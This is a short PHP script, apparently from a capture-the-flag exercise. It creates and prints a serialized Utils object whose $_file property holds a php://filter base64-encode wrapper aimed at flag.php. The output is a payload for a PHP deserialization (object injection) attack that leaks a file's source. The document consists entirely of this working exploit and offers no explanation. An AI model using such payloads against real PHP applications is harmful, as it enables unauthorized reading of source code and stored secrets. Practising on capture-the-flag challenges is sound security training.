<?php

class Utils {
    public $_file="php://filter/convert.base64-encode/resource=flag.php";
}
$a = new Utils();

echo serialize($a);

?>